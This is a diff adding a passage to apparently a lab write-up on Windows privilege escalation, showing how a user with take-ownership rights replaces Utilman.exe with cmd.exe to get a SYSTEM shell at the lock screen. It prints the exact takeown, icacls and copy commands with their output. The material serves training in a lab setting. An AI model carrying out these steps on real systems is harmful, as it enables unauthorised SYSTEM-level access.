@@ -734,9 +734,30 @@ The easiest way to gain access to another user is to gather credentials from a c
 
     We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:  
     <img src="https://user-images.githubusercontent.com/73976100/224529635-8f906fb6-d7b9-4fc2-9154-303d0fa31e6b.png" width="400">  
+    Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.  
 
+    To replace utilman, we will start by taking ownership of it with the following command:  
+    ```
+    C:\> takeown /f C:\Windows\System32\Utilman.exe
+
+    SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
+    ```  
+    To give your user full permissions over utilman.exe you can use the following command:  
+    ```
+    C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+    processed file: Utilman.exe
+    Successfully processed 1 files; Failed processing 0 files
+    ```  
+
+    After this, we will replace utilman.exe with a copy of cmd.exe:  
+    ```
+    C:\Windows\System32\> copy cmd.exe utilman.exe
+        1 file(s) copied.
+    ```  
+
+    To trigger utilman, we will lock our screen from the start button:  
+    <img src="https://user-images.githubusercontent.com/73976100/224529934-eefe5e3d-61e4-438c-b66a-56c1d36ff60e.png" width="300">  
     
-
 
 
 
